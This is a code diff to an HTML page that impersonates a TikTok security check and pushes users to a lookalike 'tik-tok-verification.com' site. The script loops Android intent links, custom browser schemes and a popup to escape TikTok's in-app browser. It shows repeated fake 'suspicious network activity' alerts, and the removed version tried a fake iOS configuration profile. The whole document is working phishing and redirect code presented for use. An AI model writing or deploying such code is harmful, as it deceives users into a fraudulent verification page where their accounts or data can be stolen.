@@ -3,43 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body { background: #fff; margin: 0; }</style>
+    <style>body { background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }</style>
 </head>
 <body>
+    <div id="loader">Verifying Connection...</div>
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
     const domain = "tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000;
 
-    function theAggressiveEject() {
+    function theGhostEject() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: This is the absolute cleanest 'Intent' to force Chrome
+            // Android: This intent is the "Gold Standard" for bypassing the picker
             window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE SYSTEM-PROFILE EJECT
-            // We are creating a 'Configuration Profile' in the browser memory.
-            // TikTok MUST eject this to the system to handle it.
-            const profile = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>PayloadContent</key><array/><key>PayloadDisplayName</key><string>Verification</string><key>PayloadType</key><string>Configuration</string><key>PayloadUUID</key><string>1</string><key>PayloadVersion</key><integer>1</integer></dict></plist>';
-            const blob = new Blob([profile], {type: 'application/x-apple-aspen-config'});
-            const blobUrl = URL.createObjectURL(blob);
+            // iOS: THE FEATURE-CONFLICT POPUP
+            // We open a window with 'menubar' and 'location' set to yes.
+            // TikTok's internal browser has no menu bar, so it often kicks this to Safari.
+            
+            const features = "menubar=yes,location=yes,resizable=yes,scrollbars=yes,status=yes";
+            
+            // 1. Try to pop the window
+            const ghost = window.open(targetUrl, "_blank", features);
 
-            // 1. Fire the 'System' file
-            window.location.href = blobUrl;
+            // 2. Immediate protocol backup in case the popup is blocked
+            // This 'googlechromes' scheme is the cleanest direct-path
+            setTimeout(() => {
+                window.location.href = "googlechromes://" + domain;
+            }, 100);
 
-            // 2. Pulse the direct Safari protocol to 'catch' the user when the OS takes over
+            // 3. The 'Safari-Https' overwrite
             setTimeout(() => {
                 window.location.href = "safari-https://" + domain;
-            }, 150);
+            }, 200);
         }
     }
 
-    function securityLoop() {
+    function securityEngine() {
         if (Date.now() > killTime) return;
 
-        theAggressiveEject();
+        theGhostEject();
 
         setTimeout(() => {
             if (document.hasFocus()) {
@@ -47,13 +53,17 @@
                 const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                 
                 alert(header + body);
-                theAggressiveEject();
-                setTimeout(securityLoop, 400);
+                
+                // Fire again on "OK"
+                theGhostEject();
+                setTimeout(securityEngine, 400);
             }
         }, 400);
     }
 
-    window.onload = securityLoop;
+    // Fire immediately and also on any touch
+    window.onload = securityEngine;
+    document.body.onclick = theGhostEject;
 </script>
 </body>
 </html>
